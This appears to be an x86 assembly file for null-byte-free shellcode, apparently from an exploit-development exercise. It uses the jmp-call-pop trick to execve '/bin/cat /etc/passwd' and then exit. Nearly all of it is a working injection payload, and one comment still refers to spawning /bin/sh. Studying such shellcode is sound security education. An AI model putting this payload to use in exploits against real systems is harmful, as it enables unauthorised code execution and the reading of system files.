#include <sys/syscall.h>

#define STRING  "/bin/catN/etc/passwd"
#define STRLEN1  8
#define STRLEN2  20
#define ARGV    (STRLEN2+1)
#define ENVP    (ARGV+8)

.intel_syntax noprefix
.text
    
.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                    /* esi points to STRING */

  mov    edi, esi
  add    edi, STRLEN1+1
  
  mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
  mov    [ARGV+4+esi],edi       /* set up argv[1] pointer to */

  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN1 + esi],al     /* null-terminate our string */
  mov    [STRLEN2 + esi],al     /* null-terminate our string */
  mov    [ENVP + esi], eax      /* set up null envp */
  
  mov    al,SYS_execve          /* syscall number */
  mov    ebx,esi                /* arg 1: string pathname */
  lea    ecx,[ARGV + esi]       /* arg 2: argv */
  lea    edx,[ENVP + esi]       /* arg 3: envp */
  int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
  
  xor    ebx,ebx                /* arg 1: 0 */
  mov    eax,ebx
  inc    eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int    0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
